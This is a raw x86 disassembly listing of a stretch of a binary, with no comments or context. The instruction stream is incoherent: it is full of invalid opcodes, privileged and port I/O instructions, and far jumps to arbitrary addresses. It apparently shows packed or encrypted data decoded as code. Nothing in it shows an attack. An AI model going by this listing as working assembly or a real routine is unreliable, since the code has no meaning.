  40fbc7:	dec    BYTE PTR [esp+edx*2-0x77]
  40fbcb:	mov    ch,0x50
  40fbcd:	shl    al,1
  40fbcf:	fcmovnbe st,st(6)
  40fbd1:	retf   0x713e
  40fbd4:	popa   
  40fbd5:	xor    dl,ch
  40fbd7:	sbb    DWORD PTR [esi],esp
  40fbd9:	cmp    BYTE PTR [edx-0x76],dl
  40fbdc:	or     eax,0x6f41c37a
  40fbe1:	adc    ah,bl
  40fbe3:	or     ecx,DWORD PTR [ebx+ebp*1-0x46]
  40fbe7:	jns    0x40fb9c
  40fbe9:	cmp    eax,0x2f028160
  40fbee:	sub    ch,BYTE PTR [eax]
  40fbf0:	push   ebx
  40fbf1:	bound  eax,QWORD PTR [edx+ecx*1-0x62faeb78]
  40fbf8:	push   ebx
  40fbf9:	dec    ebp
  40fbfa:	cmp    DWORD PTR [ebx-0x69],ebx
  40fbfd:	lds    ebp,FWORD PTR [eax+0x3b]
  40fc00:	xor    DWORD PTR [ebx-0x6b],esi
  40fc03:	outs   dx,DWORD PTR ds:[esi]
  40fc04:	inc    esp
  40fc05:	add    BYTE PTR [edi-0x146eac98],bh
  40fc0b:	push   eax
  40fc0c:	dec    ebx
  40fc0d:	mov    eax,0x6bcef449
  40fc12:	mov    BYTE PTR [esi],ah
  40fc14:	xchg   ebx,esp
  40fc16:	adc    BYTE PTR [ecx-0x1d5d5ea3],bh
  40fc1c:	push   ebx
  40fc1d:	cmp    BYTE PTR [ebx+0x4b],al
  40fc20:	dec    edi
  40fc21:	sti    
  40fc22:	and    eax,edi
  40fc24:	sbb    BYTE PTR [ebx+0x52],ch
  40fc27:	(bad)  [esi-0x5f8962cc]
  40fc2d:	mov    dh,0x79
  40fc2f:	fst    DWORD PTR [edi]
  40fc31:	cmp    al,0x3f
  40fc33:	xchg   edi,eax
  40fc34:	aam    0x94
  40fc36:	dec    edi
  40fc37:	sbb    BYTE PTR [esi-0x6cab418],bl
  40fc3d:	popa   
  40fc3e:	sbb    al,0x85
  40fc40:	push   eax
  40fc41:	add    eax,0xe4f6b6e2
  40fc46:	daa    
  40fc47:	cmp    BYTE PTR [ebx+0x51acdfc1],dl
  40fc4d:	mov    edx,DWORD PTR [edx+0x5b63ffb8]
  40fc53:	sbb    BYTE PTR [edx],bl
  40fc55:	and    BYTE PTR [ecx],al
  40fc57:	mov    esp,0x9966e481
  40fc5c:	(bad)  
  40fc5d:	cli    
  40fc5e:	pop    edi
  40fc5f:	aas    
  40fc60:	rol    BYTE PTR [ebp+edi*2+0x1b],1
  40fc64:	ret    
  40fc65:	sbb    ecx,DWORD PTR [edx-0x4a7053a9]
  40fc6b:	lods   eax,DWORD PTR ds:[esi]
  40fc6c:	push   eax
  40fc6d:	cld    
  40fc6e:	fincstp 
  40fc70:	or     eax,0x7a9928f6
  40fc75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc76:	sbb    BYTE PTR [ecx],bh
  40fc78:	aam    0x3
  40fc7a:	out    0x3e,eax
  40fc7c:	xchg   edx,eax
  40fc7d:	fbstp  TBYTE PTR [esi-0x679eac0e]
  40fc83:	aam    0xc1
  40fc85:	mov    ecx,0xea1ff6c0
  40fc8a:	stc    
  40fc8b:	test   al,0x1c
  40fc8d:	les    ebp,FWORD PTR [edx]
  40fc8f:	scas   al,BYTE PTR es:[edi]
  40fc90:	rcr    DWORD PTR [ebp+0x84186d3],cl
  40fc96:	data16 jb 0x40fca3
  40fc99:	xchg   ebp,eax
  40fc9a:	xchg   ebp,eax
  40fc9b:	and    bh,cl
  40fc9d:	inc    esp
  40fc9e:	iret   
  40fc9f:	add    eax,0xddf69a2
  40fca4:	icebp  
  40fca5:	mov    dl,0xcb
  40fca7:	pop    eax
  40fca8:	lods   al,BYTE PTR ds:[esi]
  40fca9:	pop    eax
  40fcaa:	lods   ax,WORD PTR ds:[esi]
  40fcac:	sbb    dl,BYTE PTR [edx+0x66a9add0]
  40fcb2:	add    eax,0x67cedd6
  40fcb7:	daa    
  40fcb8:	ror    DWORD PTR [eax],1
  40fcba:	loop   0x40fc55
  40fcbc:	cmp    ebx,DWORD PTR [esi-0x7dac1e96]
  40fcc2:	push   eax
  40fcc3:	lahf   
  40fcc4:	les    ebp,FWORD PTR [edx+0x694dcfb4]
  40fcca:	jmp    0x40fcd8
  40fccc:	rol    DWORD PTR [ebx+0x47],cl
  40fccf:	test   eax,0x4464f2de
  40fcd4:	add    eax,0x3535806
  40fcd9:	jmp    0x40fc5e
  40fcdb:	mov    bh,0x47
  40fcdd:	mov    gs,WORD PTR [eax-0x5bf1aae7]
  40fce3:	xchg   DWORD PTR [edx-0x66],eax
  40fce6:	mov    ch,0xcb
  40fce8:	mov    edi,0x60f5e100
  40fced:	fstp   TBYTE PTR [ecx+0x62]
  40fcf0:	push   ebx
  40fcf1:	cmp    eax,0x20fd9a4a
  40fcf6:	stos   BYTE PTR es:[edi],al
  40fcf7:	stos   DWORD PTR es:[edi],eax
  40fcf8:	sbb    ebx,DWORD PTR [ecx+0x4d3fce8]
  40fcfe:	pop    ebp
  40fcff:	popa   
  40fd00:	mov    esp,0xd64766db
  40fd05:	inc    eax
  40fd06:	jb     0x40fccd
  40fd08:	ja     0x40fcbc
  40fd0a:	dec    edi
  40fd0b:	sbb    BYTE PTR ds:0xdb3a0451,ch
  40fd11:	mov    dh,0x57
  40fd13:	sbb    al,0x53
  40fd15:	lahf   
  40fd16:	(bad)  
  40fd17:	leave  
  40fd18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd19:	call   0x982f98cb
  40fd1e:	scas   al,BYTE PTR es:[edi]
  40fd1f:	mov    ebp,0xd9c3f437
  40fd24:	push   edx
  40fd25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd26:	aaa    
  40fd27:	add    ebp,ecx
  40fd29:	fs in  eax,dx
  40fd2b:	xor    DWORD PTR [ebx-0x2],edx
  40fd2e:	mov    eax,DWORD PTR [edx+0x600254c9]
  40fd34:	cmp    al,0x6a
  40fd36:	cmp    eax,DWORD PTR [eax-0x51]
  40fd39:	out    0x22,al
  40fd3b:	sub    eax,0xc663005
  40fd40:	sbb    BYTE PTR [edx+eax*1],0x71
  40fd44:	fisub  WORD PTR [edx-0x2b]
  40fd47:	sbb    eax,esp
  40fd49:	test   BYTE PTR [ebp-0x2b04c25a],ch
  40fd4f:	lea    edx,[ebp-0x68]
  40fd52:	nop
  40fd53:	mov    cs,WORD PTR [ebx]
  40fd55:	push   0xffffffe6
  40fd57:	pop    ecx
  40fd58:	push   edi
  40fd59:	das    
  40fd5a:	mov    ebx,0x9d2f860
  40fd5f:	add    al,0x53
  40fd61:	cmp    al,0x3d
  40fd63:	pop    es
  40fd64:	jmp    0xe862:0x536abc70
  40fd6b:	fdiv   DWORD PTR es:[edx+0x49]
  40fd6f:	and    DWORD PTR [ebx+0x69],ebx
  40fd72:	or     al,0x41
  40fd74:	lahf   
  40fd75:	and    bh,BYTE PTR [esi+ebp*4]
  40fd78:	call   0x8eb07482
  40fd7d:	iret   
  40fd7e:	data16 daa 
  40fd80:	dec    eax
  40fd81:	add    al,0xee
  40fd83:	shl    BYTE PTR ds:0x8723606b,0x2b
  40fd8a:	cmp    al,0x96
  40fd8c:	clc    
  40fd8d:	jp     0x40fe08
  40fd8f:	mov    dh,0x57
  40fd91:	inc    esi
  40fd92:	or     DWORD PTR ds:0x19d336e7,ebx
  40fd98:	add    DWORD PTR [esi],0x5b847525
  40fd9e:	ret    0x53cc
  40fda1:	jbe    0x40fd98
  40fda3:	outs   dx,DWORD PTR ds:[esi]
  40fda4:	jle    0x40fdb0
  40fda6:	leave  
  40fda7:	mov    al,ds:0xe69e6b16
  40fdac:	ficom  WORD PTR [edx]
  40fdae:	inc    ebx
  40fdaf:	xchg   edi,eax
  40fdb0:	push   edi
  40fdb1:	push   eax
  40fdb2:	sub    ax,0x7018
  40fdb6:	ins    BYTE PTR es:[edi],dx
  40fdb7:	mov    ch,0x44
  40fdb9:	xchg   esp,eax
  40fdba:	sub    bh,BYTE PTR [ecx]
  40fdbc:	xor    esp,DWORD PTR [ecx+0x7be4d4f7]
  40fdc2:	xor    edx,esp
  40fdc4:	pushf  
  40fdc5:	hlt    
  40fdc6:	sahf   
  40fdc7:	or     al,BYTE PTR [edi+0x3c]
  40fdca:	data16 std 
  40fdcc:	push   edx
  40fdcd:	push   edi
  40fdce:	jns    0x40fdba
  40fdd0:	jecxz  0x40fe36
  40fdd2:	dec    ecx
  40fdd3:	ficomp WORD PTR [ebx+0x418266de]
  40fdd9:	outs   dx,DWORD PTR ds:[esi]
  40fdda:	fistp  QWORD PTR ds:0xc6c7156
  40fde0:	gs (bad) 
  40fde2:	das    
  40fde3:	jns    0x40fd6b
  40fde5:	imul   esp,ebx,0xe4e3a321
  40fdeb:	adc    dl,dh
  40fded:	push   0xfffffff6
  40fdef:	fwait
  40fdf0:	ins    DWORD PTR es:[edi],dx
  40fdf1:	test   ah,dl
  40fdf3:	call   0xd745:0x6f798cf1
  40fdfa:	xor    dl,dl
  40fdfc:	mov    dl,0x54
  40fdfe:	mov    ds:0x248a4819,eax
  40fe03:	retf   
  40fe04:	push   esp
  40fe05:	out    dx,eax
  40fe06:	int    0x82
  40fe08:	push   ebx
  40fe09:	in     al,dx
  40fe0a:	imul   ebp,DWORD PTR ds:0xc8981a99,0x29
  40fe11:	jmp    0x69cc826d
  40fe16:	shl    BYTE PTR [ebx-0xef677ae],1
  40fe1c:	and    ah,BYTE PTR [esi+0x7f]
  40fe1f:	jbe    0x40fe9e
  40fe21:	inc    ebx
  40fe22:	inc    eax
  40fe23:	cmp    eax,0x21603253
  40fe28:	xchg   ecx,eax
  40fe29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe2a:	push   esi
  40fe2b:	sbb    BYTE PTR [ebp+ebx*1+0x7c],bl
  40fe2f:	lods   eax,DWORD PTR ds:[esi]
  40fe30:	cmp    dl,cl
  40fe32:	xchg   edi,eax
  40fe33:	and    DWORD PTR [ebx+0x31],edx
  40fe36:	dec    edx
  40fe37:	jne    0x40feb3
  40fe39:	jbe    0x40fde4
  40fe3b:	stc    
  40fe3c:	sub    al,0x4a
  40fe3e:	mov    ds:0x52323065,al
  40fe43:	sbb    BYTE PTR [edx+0x26],ch
  40fe46:	iret   
  40fe47:	add    ebx,eax
  40fe49:	pop    esp
  40fe4a:	jmp    0xe02b:0x6d2e530d
  40fe51:	jbe    0x40fec0
  40fe53:	mov    eax,ds:0x15916ab7
  40fe58:	xchg   DWORD PTR [esi],edi
  40fe5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe5b:	push   esp
  40fe5c:	out    dx,al
  40fe5d:	xlat   BYTE PTR ds:[ebx]
  40fe5e:	or     ebx,DWORD PTR [edi-0x28f760d8]
  40fe64:	push   0x820c4cc9
  40fe69:	sbb    dl,bh
  40fe6b:	sbb    DWORD PTR [ecx+0x336310f],ecx
  40fe71:	push   ss
  40fe72:	mov    al,BYTE PTR [ecx-0x4ed40ab]
  40fe78:	mov    bl,0xe9
  40fe7a:	sub    eax,0x85d9d886
  40fe7f:	sbb    DWORD PTR [edx-0x2f300b54],eax
  40fe85:	inc    edx
  40fe86:	jmp    0x962a:0xbbc854f3
  40fe8d:	imul   edx,DWORD PTR [ebp-0x5965b383],0x7f5a34bb
  40fe97:	fwait
  40fe98:	pop    ss
  40fe99:	push   ds
  40fe9a:	or     DWORD PTR [esi+0x7566d137],esp
  40fea0:	in     al,0x6
  40fea2:	cmp    al,0xf5
  40fea4:	neg    DWORD PTR [ebp-0x4b235a99]
  40feaa:	out    dx,eax
  40feab:	sbb    DWORD PTR [ebx+ebp*1+0x57bbcdd0],ebp
  40feb2:	fs leave 
  40feb4:	push   ds
  40feb5:	push   es
  40feb6:	aaa    
  40feb7:	out    dx,eax
  40feb8:	aas    
  40feb9:	stos   BYTE PTR es:[edi],al
  40feba:	jo     0x40ff13
  40febc:	inc    edi
  40febd:	dec    ecx
  40febe:	pop    es
  40febf:	mov    eax,ds:0x19b6f46a
  40fec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fec5:	out    dx,eax
  40fec6:	xlat   BYTE PTR ds:[ebx]
  40fec7:	inc    ecx
  40fec8:	hlt    
  40fec9:	gs jns 0x40fe9b
  40fecc:	sbb    ecx,DWORD PTR [edi]
  40fece:	in     al,dx
  40fecf:	rol    BYTE PTR [eax+0x32],0xe6
  40fed3:	sbb    DWORD PTR [edi-0x1a],ebp
  40fed6:	test   BYTE PTR [eax],al
  40fed8:	add    BYTE PTR [ebp+0x4a],ch
  40fedb:	mov    al,ds:0xed511853
  40fee0:	jb     0x40fe64
  40fee2:	stos   BYTE PTR es:[edi],al
  40fee3:	jmp    ebp
  40fee5:	dec    eax
  40fee6:	pop    es
  40fee7:	sar    DWORD PTR [esi],cl
  40fee9:	push   0xffffffa1
  40feeb:	bound  esi,QWORD PTR [esp+edx*4-0x67787a54]
  40fef2:	sbb    eax,0xf0a5f0bc
  40fef7:	xchg   ebp,eax
  40fef8:	mov    eax,0x1d1a8901
  40fefd:	mov    al,0x2
  40feff:	sbb    esi,DWORD PTR [edx+0x48]
  40ff02:	xor    DWORD PTR [ebx+0x3c3b14a6],edx
  40ff08:	push   ebx
  40ff09:	inc    edi
  40ff0a:	hlt    
  40ff0b:	(bad)  
  40ff0c:	pushf  
  40ff0d:	sub    ebp,DWORD PTR [eax]
  40ff0f:	fwait
  40ff10:	in     al,dx
  40ff11:	cmp    ebx,DWORD PTR [ebp-0x22d0d6e7]
  40ff17:	test   cl,bl
  40ff19:	adc    al,0x41
  40ff1b:	inc    ebx
  40ff1c:	push   ebx
  40ff1d:	nop
  40ff1e:	jbe    0x40ff0d
  40ff20:	out    0x5,al
  40ff22:	mov    ebp,0x360092df
  40ff27:	sbb    BYTE PTR [ecx+0x2010e326],ch
  40ff2d:	ret    0xb4b0
  40ff30:	push   ebp
  40ff31:	xchg   edi,eax
  40ff32:	scas   al,BYTE PTR es:[edi]
  40ff33:	mov    WORD PTR [ecx+edi*8-0x4188c12a],ss
  40ff3a:	mov    al,ds:0x7c295185
  40ff3f:	sub    BYTE PTR [eax+0x29],0x88
  40ff43:	dec    ebx
  40ff44:	fsubr  QWORD PTR [edx+0x43]
  40ff47:	mov    bl,0xcf
  40ff49:	inc    edx
  40ff4a:	lods   al,BYTE PTR ds:[esi]
  40ff4b:	pop    eax
  40ff4c:	sub    DWORD PTR [edx+0x64],ecx
  40ff4f:	mov    esp,DWORD PTR [ebx+0x4e]
  40ff52:	fadd   QWORD PTR [eax+0x52]
  40ff55:	imul   esi,DWORD PTR [edi],0x96c09e5a
  40ff5b:	add    esi,ecx
  40ff5d:	mov    DWORD PTR [ecx-0x2],edi
  40ff60:	jb     0x40ff06
  40ff62:	cmp    DWORD PTR [esi],ebx
  40ff64:	push   0x18
  40ff66:	test   DWORD PTR [eax-0x65c3b6fc],0x13a2e9ad
  40ff70:	(bad)  
  40ff72:	inc    edi
  40ff73:	push   edx
  40ff74:	xor    DWORD PTR [edx+0x14e5fb66],ecx
  40ff7a:	aas    
  40ff7b:	loopne 0x40ff32
  40ff7d:	adc    eax,0x65556cb2
  40ff82:	mov    al,ds:0xf504c07b
  40ff87:	pop    esi
  40ff88:	xor    dl,BYTE PTR [eax-0x5f5db5ba]
  40ff8e:	jns    0x40ff81
  40ff90:	mov    es,WORD PTR [esi+edi*1-0x16]
  40ff94:	or     DWORD PTR [esi],0xa33fbace
  40ff9a:	mov    cl,0x19
  40ff9c:	jl     0x40ff62
  40ff9e:	pop    ebx
  40ff9f:	xchg   ecx,eax
  40ffa0:	mov    dl,0x5d
  40ffa2:	sbb    BYTE PTR [eax],bl
  40ffa4:	adc    BYTE PTR [edi-0x425741da],0xb2
  40ffab:	add    BYTE PTR [ebx+0x6b],bh
  40ffae:	test   al,0xc9
  40ffb0:	mov    WORD PTR [edi],es
  40ffb2:	lock add dh,BYTE PTR [ebx+0x536ec1a6]
  40ffb9:	into   
  40ffba:	inc    ebx
  40ffbb:	stos   BYTE PTR es:[edi],al
  40ffbc:	in     eax,0x21
  40ffbe:	and    DWORD PTR [eax],esi
  40ffc0:	aas    
  40ffc1:	push   0x1a
  40ffc3:	loop   0x40ffbf
  40ffc5:	push   edx
  40ffc6:	js     0x40ffda
  40ffc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffc9:	mov    edx,0x3ab41979
  40ffce:	adc    dl,dh
  40ffd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffd1:	int    0xe
  40ffd3:	sbb    edx,DWORD PTR [edx]
  40ffd5:	shr    DWORD PTR [ecx-0x4e],1
  40ffd8:	pop    ss
  40ffd9:	jno    0x40ff9a
  40ffdb:	dec    ebp
  40ffdc:	push   ebp
  40ffdd:	sub    eax,0xe13b9ea8
  40ffe2:	xlat   BYTE PTR ds:[ebx]
  40ffe3:	outs   dx,DWORD PTR ds:[esi]
  40ffe4:	ret    
  40ffe5:	jbe    0x40ffe1
  40ffe7:	rol    BYTE PTR [edx+0x2aeae169],1
  40ffed:	jne    0x40ff9b
  40ffef:	jbe    0x40ff98
  40fff1:	adc    DWORD PTR [esi-0x49],esp
  40fff4:	jmp    0x40ff78
  40fff6:	adc    bh,BYTE PTR [edi-0x455bf2fa]
  40fffc:	and    al,0xe
  40fffe:	push   ebx
  40ffff:	fstp   DWORD PTR [edx-0x77]
  410002:	mov    eax,ds:0xff8f1e93
  410007:	mov    al,0x53
  410009:	in     al,dx
  41000a:	lods   al,BYTE PTR ds:[esi]
  41000b:	test   BYTE PTR [esi+0x57],cl
  41000e:	ret    
  41000f:	sub    edx,DWORD PTR [ecx]
  410011:	imul   edx,DWORD PTR [edi+esi*4+0x542d7582],0x69
  410019:	xchg   ebp,eax
  41001a:	or     dh,BYTE PTR [edi]
  41001c:	jb     0x40ffe6
  41001e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41001f:	push   ebp
  410020:	mov    ds:0x10cd2df5,al
  410025:	ins    BYTE PTR es:[edi],dx
  410026:	mov    ebp,DWORD PTR [ebp-0xe0c54d6]
  41002c:	xor    BYTE PTR [ecx-0x15e42f3c],bh
  410032:	jns    0x410091
  410034:	dec    esp
  410035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410036:	(bad)  
  410037:	aaa    
  410038:	or     ebx,ebx
  41003a:	push   es
  41003b:	sub    eax,DWORD PTR [esi-0x28e7b0ef]
  410041:	gs in  al,0x46
  410044:	cld    
  410045:	and    bh,dh
  410047:	fst    DWORD PTR [ebx+0x5a]
  41004a:	mov    edi,0x9f9643fb
  41004f:	and    esp,DWORD PTR [edx+0x69]
  410052:	in     al,dx
  410053:	jge    0x4100ce
  410055:	(bad)  
  410056:	in     eax,0xda
  410058:	dec    esi
  410059:	dec    ebp
  41005a:	sbb    eax,0x7caf91aa
  41005f:	inc    eax
  410060:	jno    0x41004b
  410062:	in     al,dx
  410063:	fs add eax,0x16870467
  410069:	push   ebx
  41006a:	inc    ebx
  41006b:	sbb    BYTE PTR [esi],cl
  41006d:	mov    ecx,ecx
  41006f:	push   ds
  410070:	jnp    0x41009c
  410072:	leave  
  410073:	test   BYTE PTR [ebp+0x8],ch
  410076:	sub    DWORD PTR [edi+0x53],edx
  410079:	lea    edi,[ecx]
  41007b:	leave  
  41007c:	inc    esp
  41007d:	dec    ecx
  41007e:	dec    eax
  41007f:	(bad)  
  410081:	mov    al,0x79
  410083:	adc    al,0xc
  410085:	ret    
  410086:	sub    BYTE PTR [eiz*1+0x599466c1],0x67
  41008e:	test   al,0x68
  410090:	xchg   eax,ebp
  410092:	mov    al,ds:0x61fd0119
  410097:	lds    dx,DWORD PTR [ebx]
  41009a:	or     bl,BYTE PTR [ebx+edx*2+0x78d1449c]
  4100a1:	fcom   QWORD PTR [ebp-0x45]
  4100a4:	je     0x41010f
  4100a6:	pop    ecx
  4100a7:	mov    ebx,es
  4100a9:	adc    bl,BYTE PTR [edi]
  4100ab:	jmp    0x3bca:0x61621f60
  4100b2:	inc    ebx
  4100b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100b4:	iret   
  4100b5:	scas   eax,DWORD PTR es:[edi]
  4100b6:	in     al,0xc6
  4100b8:	imul   ebp,DWORD PTR [ecx-0x15],0xffffffb1
  4100bc:	jmp    0x41004c
  4100be:	sbb    eax,0x63e2340e
  4100c3:	test   DWORD PTR [edx+0x66f1c1c4],edx
  4100c9:	popf   
  4100ca:	es cli 
  4100cc:	xchg   esi,eax
  4100cd:	cmc    
  4100ce:	jl     0x4100c9
  4100d0:	cmp    eax,0x6f1b466b
  4100d5:	retf   
  4100d6:	retf   0x2707
  4100d9:	cmp    al,0x10
  4100db:	out    0xbe,eax
  4100dd:	data16 shl BYTE PTR cs:[edi+0x5b],cl
  4100e2:	leave  
  4100e3:	nop
  4100e4:	adc    bh,bh
  4100e6:	xor    al,0xab
  4100e8:	sbb    al,0x4f
  4100ea:	test   eax,0x39f1f3dc
  4100ef:	fst    DWORD PTR [eax]
  4100f1:	sahf   
  4100f2:	in     eax,dx
  4100f3:	and    eax,0x3f24a453
  4100f8:	enter  0x94e1,0x6a
  4100fc:	in     eax,dx
  4100fd:	ins    BYTE PTR es:[edi],dx
  4100fe:	pop    esi
  4100ff:	sbb    ch,cl
  410101:	or     al,0x7d
  410103:	not    BYTE PTR [ecx]
  410105:	pop    eax
  410106:	cmp    eax,0x54d6c2d1
  41010b:	adc    al,0x64
  41010d:	pmullw mm6,QWORD PTR [esi+0x13]
  410111:	mov    eax,0x6cd9f55c
  410116:	or     bl,BYTE PTR [ebx]
  410118:	jnp    0x410123
  41011a:	stos   BYTE PTR es:[edi],al
  41011b:	fimul  WORD PTR [ecx+esi*2-0x189a2817]
  410122:	loop   0x410144
  410124:	ror    cl,cl
  410126:	test   BYTE PTR [edi+0x4d4e2da6],0x82
  41012d:	imul   eax,edi,0xc135eae7
  410133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410134:	addr16 hlt 
  410136:	and    si,bp
  410139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41013a:	add    cl,BYTE PTR [ebx]
  41013c:	data16 ja 0x41019b
  41013f:	sbb    BYTE PTR [edx-0x1dcf7465],ah
  410145:	push   eax
  410146:	(bad)  
  410148:	dec    ebx
  410149:	shl    DWORD PTR [esi+0x5f],1
  41014c:	enter  0x18af,0x23
  410150:	push   cs
  410151:	or     al,BYTE PTR [edi+0x1f]
  410154:	sbb    ebp,DWORD PTR [eax]
  410156:	jno    0x41014d
  410158:	mov    ch,0x5
  41015a:	ficomp DWORD PTR [ecx]
  41015c:	mov    BYTE PTR [ebp-0x69],al
  41015f:	inc    esp
  410160:	jbe    0x410142
  410162:	pushaw 
  410164:	xchg   edx,eax
  410165:	loope  0x410175
  410167:	add    BYTE PTR [ebx],ah
  410169:	and    bl,BYTE PTR [edi+0x56d6b619]
  41016f:	cld    
  410170:	cmp    BYTE PTR [esi+0x7c],dh
  410173:	iret   
  410174:	push   ebx
  410175:	mov    esi,0x98cbd09c
  41017a:	jp     0x4101b2
  41017c:	popf   
  41017d:	imul   ebx,esp,0xe7154aa4
  410183:	pop    ecx
  410184:	adc    eax,0x536e5287
  410189:	clc    
  41018a:	mov    WORD PTR [edx-0x6e],es
  41018d:	xchg   DWORD PTR [edx-0x11],eax
  410190:	jno    0x4101fb
  410192:	push   0x14e1cb11
  410197:	mov    dl,0xe3
  410199:	cmp    al,0x66
  41019b:	push   0xffffffba
  41019d:	lahf   
  41019e:	test   DWORD PTR es:[edi],esp
  4101a1:	stos   BYTE PTR es:[edi],al
  4101a2:	dec    ebx
  4101a3:	sbb    edx,DWORD PTR [eax-0x42]
  4101a6:	scas   al,BYTE PTR es:[edi]
  4101a7:	adc    BYTE PTR [ebp+0x3d],al
  4101aa:	and    bh,BYTE PTR [edi+0x52]
  4101ad:	cwde   
  4101ae:	out    0xc3,eax
  4101b0:	inc    edi
  4101b1:	push   eax
  4101b2:	sub    eax,0x3a760f29
  4101b7:	sbb    DWORD PTR [esi-0x41647754],ecx
  4101bd:	cmp    ah,BYTE PTR [edi]
  4101bf:	leave  
  4101c0:	push   edx
  4101c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101c2:	inc    ecx
  4101c3:	rep outs dx,DWORD PTR ds:[esi]
  4101c5:	jmp    0x61cb:0xf647d6d0
  4101cc:	pusha  
  4101cd:	push   0x67
  4101cf:	mov    dx,0x6f80
  4101d3:	shl    DWORD PTR [ebx],1
  4101d5:	mov    ah,0xb8
  4101d7:	nop
  4101d8:	push   ebx
  4101d9:	and    BYTE PTR [ebx-0x48],ch
  4101dc:	(bad)  
  4101dd:	mov    ds:0x69a267c8,eax
  4101e2:	sahf   
  4101e3:	and    DWORD PTR [eax-0x4a57075d],esi
  4101e9:	aam    0x66
  4101eb:	mov    ecx,0xae1afd99
  4101f0:	sbb    al,0x9c
  4101f2:	push   ds
  4101f3:	sbb    eax,DWORD PTR [esi]
  4101f5:	push   esi
  4101f6:	dec    eax
  4101f7:	(bad)  
  4101f8:	cmp    ebx,DWORD PTR [edx+0x2d]
  4101fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101fc:	push   ebx
  4101fd:	adc    BYTE PTR [eax],dh
  4101ff:	je     0x4101b6
  410201:	(bad)  
  410203:	ficomp WORD PTR [edi+0x7cfd7769]
  410209:	push   esp
  41020a:	sbb    al,0x6c
  41020c:	mov    ds:0x2e6a6638,al
  410211:	in     eax,dx
  410212:	lods   al,BYTE PTR ds:[esi]
  410213:	sub    esi,ebp
  410215:	mov    ds:0xd517d08f,al
  41021a:	es pop ebp
  41021c:	sub    eax,0xe580d06b
  410221:	jp     0x41029c
  410223:	inc    edi
  410224:	mov    BYTE PTR [esi+0x48736168],dl
  41022a:	call   0xa178c248
  41022f:	(bad)  
  410230:	in     al,dx
  410231:	pop    ebp
  410232:	mov    esp,0xeba253e7
  410237:	clc    
  410238:	push   ss
  410239:	cmp    BYTE PTR [edx+0x33694cc5],0xb3
  410240:	imul   esp,DWORD PTR [edx-0x15],0x65
  410244:	adc    al,0x5b
  410246:	data16 jae 0x4101fa
  410249:	pop    edi
  41024a:	xor    eax,0xc12457da
  41024f:	fild   QWORD PTR [esi+0x10]
  410252:	out    0x24,al
  410254:	sub    edi,esi
  410256:	pop    ebp
  410257:	mov    dl,0xf7
  410259:	inc    edx
  41025a:	rol    DWORD PTR [ebp+0x73dbc453],cl
  410260:	pop    ds
  410261:	fwait
  410262:	(bad)  
  410263:	mov    ds:0x15726b1c,eax
  410268:	jle    0x4101f9
  41026a:	es or  eax,0xf8f94200
  410270:	push   ebx
  410271:	(bad)  
  410272:	(bad)  
  410274:	clc    
  410275:	adc    esi,DWORD PTR [edi-0xc]
  410278:	ror    DWORD PTR [ecx-0x18],0x0
  41027c:	push   esp
  41027d:	jmp    0x90406f86
  410282:	aam    0xba
  410284:	push   ebx
  410285:	loope  0x4102df
  410287:	adc    BYTE PTR [ebx+0x3fde1be4],0xa6
  41028e:	mov    DWORD PTR [ecx],ebx
  410290:	cwde   
  410291:	jge    0x4102aa
  410293:	mov    ?,WORD PTR [ecx+0x5337c183]
  410299:	aas    
  41029a:	cmp    bl,cl
  41029c:	mov    ah,0xa9
  41029e:	xchg   edi,eax
  41029f:	xlat   BYTE PTR ds:[ebx]
  4102a0:	inc    ebp
  4102a1:	push   0x78
  4102a3:	mov    esi,0x9ae6370c
  4102a8:	jno    0x4102a6
  4102aa:	add    DWORD PTR [eax],esp
  4102ac:	test   DWORD PTR [esi],0x77359c79
  4102b2:	jno    0x41032a
  4102b4:	int    0x6a
  4102b6:	pop    ds
  4102b7:	nop
  4102b8:	xor    DWORD PTR [edx-0x56effb32],ebp
  4102be:	retw   
  4102c0:	push   es
  4102c1:	mov    dl,0x5e
  4102c3:	pop    ds
  4102c4:	push   ss
  4102c5:	cmc    
  4102c6:	outs   dx,BYTE PTR ds:[esi]
  4102c7:	inc    esi
  4102c8:	fisubr WORD PTR [edx-0x5a]
  4102cb:	xchg   ecx,eax
  4102cc:	adc    DWORD PTR [eax-0x62],ebp
  4102cf:	mov    cl,0xca
  4102d1:	mul    BYTE PTR [esi-0x12]
  4102d4:	es inc ecx
  4102d6:	add    al,0x2b
  4102d8:	fnstenv [ebp+0x1ef419a5]
  4102de:	in     al,dx
  4102df:	scas   al,BYTE PTR es:[edi]
  4102e0:	mov    eax,ds:0x89d23697
  4102e5:	(bad)  
  4102e6:	icebp  
  4102e7:	sbb    DWORD PTR [eax+edi*8],ebp
  4102ea:	pcmpeqw mm4,QWORD PTR [edx-0x14e60031]
  4102f1:	push   edi
  4102f2:	sub    al,0x7d
  4102f4:	inc    ebp
  4102f5:	aad    0x3b
  4102f7:	jg     0x41034c
  4102f9:	bound  edx,QWORD PTR [eax-0x7b]
  4102fc:	mov    edi,0x4e5d47d2
  410301:	imul   ebp,DWORD PTR [edx-0x31],0x2e6a1064
  410308:	int3   
  410309:	pusha  
  41030a:	(bad)  
  41030b:	stos   DWORD PTR es:[edi],eax
  41030c:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41030e:	xchg   edx,eax
  41030f:	pusha  
  410310:	adc    eax,DWORD PTR [ecx+0x6e]
  410313:	aas    
  410314:	lock sahf 
  410316:	inc    ebx
  410317:	shl    ecx,cl
  410319:	push   ebx
  41031a:	mov    eax,0x53897807
  41031f:	shr    BYTE PTR [ebx-0x1f5599df],cl
  410325:	sub    BYTE PTR [edx+ebp*1-0x62],cl
